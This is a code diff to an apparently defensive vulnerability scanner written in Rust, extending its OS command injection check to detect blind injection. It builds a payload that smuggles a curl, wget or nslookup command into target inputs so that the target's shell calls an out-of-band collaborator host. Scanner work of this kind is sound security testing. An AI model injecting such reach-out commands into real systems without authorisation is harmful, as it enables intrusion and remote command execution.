@@ -27,24 +27,33 @@
 //!
 //! This settles the cases where the command's output reaches the response. A sink whose
 //! output goes nowhere is *blind*, and blind command injection needs an out-of-band
-//! channel to confirm — which this build does not yet wire into the lab. Until it does,
-//! a blind sink here reads as [`Verification::Refuted`]: the experiment ran and the
-//! product did not come back. That is honest about what was tested, not a claim the sink
-//! is safe.
+//! channel to confirm. When the run has an out-of-band collaborator ([`Lab::canary`]),
+//! this reaches for it: where no arithmetic came back, it injects a payload that makes
+//! the shell fetch or resolve a collaborator URL, and a callback bearing the planted
+//! token proves execution even though the response revealed nothing. Without a
+//! collaborator a blind sink reads as [`Verification::Refuted`] — honest about what was
+//! tested, not a claim the sink is safe.
 
 use async_trait::async_trait;
 use nullhawk_types::finding::{
     Evidence, FindingSource, Hypothesis, Location, MessagePart, Severity,
 };
+use nullhawk_types::ids::InteractionId;
 use nullhawk_types::inject::{inputs, inputs_in, substitute, value_at};
 use nullhawk_types::object::ObjectLocation;
 use nullhawk_types::verify::{
     DetectorId, DetectorInfo, DetectorMode, Support, Verification, Writeup,
 };
 use nullhawk_types::Result;
-use nullhawk_verify::Lab;
+use nullhawk_verify::{Canary, Lab};
 
 use crate::{ActiveCheck, Budget, Subject};
+
+/// How long to wait for a blind callback, and how often to check. A shell that reaches
+/// out is not instantaneous — it has to run the fetcher and make its own request — so the
+/// token is polled a handful of times before the sink is called quiet.
+const CALLBACK_POLLS: usize = 6;
+const CALLBACK_INTERVAL: std::time::Duration = std::time::Duration::from_millis(750);
 
 /// The check.
 pub struct OsCommandInjection;
@@ -54,7 +63,7 @@ const SETTLES: &str = "input.cmdi";
 const INFO: DetectorInfo = DetectorInfo {
     id: DetectorId("input.cmdi"),
     name: "OS command injection",
-    version: "1.0.0",
+    version: "1.1.0",
     about: "whether an input is run by a shell — proven by the shell evaluating an \
             arithmetic expansion the input carries, confirmed by a second sum",
     mode: DetectorMode::Active,
@@ -182,12 +191,29 @@ impl ActiveCheck for OsCommandInjection {
             });
         }
 
+        // No arithmetic came back. If the run has a collaborator, the sink may still be
+        // a *blind* one — the shell runs the input but its output goes nowhere near the
+        // response. Make it reach out and watch the collaborator instead.
+        if let Some(canary) = lab.canary() {
+            if let Some(verdict) = blind(subject, lab, &slot, &base, canary, budget).await {
+                return Ok(verdict);
+            }
+            return Ok(Verification::Refuted {
+                note: format!(
+                    "no arithmetic payload came back from {}, and a payload told to fetch \
+                     the collaborator produced no callback either — the input shows no \
+                     sign of reaching a shell, blind or otherwise",
+                    describe(&slot),
+                ),
+            });
+        }
+
         Ok(Verification::Refuted {
             note: format!(
                 "no shell evaluated an arithmetic payload in {}: it came back unchanged or \
                  absent, so either the input is not run by a shell, or it is run but its \
                  output does not reach the response — a blind sink this in-band check \
-                 cannot settle",
+                 cannot settle without an out-of-band collaborator (pass --collaborator)",
                 describe(&slot),
             ),
         })
@@ -301,6 +327,86 @@ fn answered(answer: &Answer, payload: &str) -> Evidence {
         response: None,
         note: format!("payload `{payload}` — answered {}", answer.status),
     }
+}
+
+/// The blind case: make the shell reach the collaborator, and watch for the callback.
+///
+/// Each breakout context runs the same reach-out command — fetch the canary URL, or
+/// failing that resolve its host — so whichever tool the target has, and whichever way
+/// the collaborator is addressed (a token in the path over HTTP, or in a subdomain over
+/// DNS), one of them arrives. The URL carries a token only these requests minted, so an
+/// interaction bearing it is proof the shell ran the command, whatever the response said.
+///
+/// Returns `None` — not a refutation — when nothing could be sent or nothing called back
+/// in the polling window: a slower callback is still possible, and the caller turns that
+/// into the honest refuted.
+async fn blind(
+    subject: &Subject,
+    lab: &dyn Lab,
+    slot: &ObjectLocation,
+    base: &str,
+    canary: Canary,
+    budget: &Budget,
+) -> Option<Verification> {
+    // curl and wget cover the common HTTP fetchers; nslookup makes it a DNS callback when
+    // the collaborator is addressed by subdomain. `>/dev/null 2>&1` keeps the target's own
+    // response unchanged, so nothing here is mistaken for reflected output.
+    let host = host_of(&canary.url);
+    let reach = format!(
+        "curl -s {url} >/dev/null 2>&1 || wget -qO- {url} >/dev/null 2>&1 || nslookup {host} >/dev/null 2>&1",
+        url = canary.url,
+    );
+
+    let mut sent = 0usize;
+    let mut evidence = vec![from_exchange(subject)];
+    for (_context, prefix, suffix) in CONTEXTS {
+        if sent >= budget.per_hypothesis.max(1) {
+            break;
+        }
+        let payload = format!("{base}{prefix}{reach}{suffix}");
+        if let Some(answer) = probe(subject, lab, slot, &payload).await {
+            evidence.push(answered(&answer, &format!("{prefix}<reach>{suffix}")));
+            sent += 1;
+        }
+    }
+    if sent == 0 {
+        return None;
+    }
+
+    for _ in 0..CALLBACK_POLLS {
+        tokio::time::sleep(CALLBACK_INTERVAL).await;
+        let Ok(interactions) = lab.interactions(&canary.token).await else {
+            continue;
+        };
+        if let Some(hit) = interactions.into_iter().next() {
+            evidence.push(Evidence::OutOfBand {
+                request: subject.exchange.id,
+                interaction: InteractionId::new(),
+                protocol: hit.protocol.clone(),
+            });
+            return Some(Verification::Reproduced {
+                note: format!(
+                    "{} is run by a shell: a payload told to fetch the collaborator caused \
+                     a {} interaction from {}, carrying the token planted only in these \
+                     requests. The response revealed nothing — this is a blind command \
+                     injection, proven by the callback rather than the page",
+                    describe(slot),
+                    hit.protocol,
+                    hit.source,
+                ),
+                evidence,
+            });
+        }
+    }
+    None
+}
+
+/// The host of a URL, without scheme, port or path — for a DNS-based reach-out. In
+/// subdomain-mode canaries this label carries the token.
+fn host_of(url: &str) -> String {
+    let after = url.split_once("://").map(|(_, r)| r).unwrap_or(url);
+    let hostport = after.split(['/', '?']).next().unwrap_or(after);
+    hostport.split(':').next().unwrap_or(hostport).to_string()
 }
 
 fn from_exchange(subject: &Subject) -> Evidence {
@@ -466,5 +572,17 @@ mod tests {
         // The reflected expansion is present, so `ran` would be false for it.
         assert!(reflected.body_has(&format!("$(({A}*{B1}))")));
         assert!(!reflected.body_has(&(A * B1).to_string()));
+    }
+
+    #[test]
+    fn the_reach_out_host_is_stripped_to_a_bare_label() {
+        // Path-mode: the collaborator authority, no scheme/path. Subdomain-mode: the
+        // token-bearing label, which is what a DNS reach-out must resolve.
+        assert_eq!(host_of("http://127.0.0.1:8888/abc123"), "127.0.0.1");
+        assert_eq!(
+            host_of("https://deadbeef1234.oob.example/"),
+            "deadbeef1234.oob.example"
+        );
+        assert_eq!(host_of("http://oob.example"), "oob.example");
     }
 }
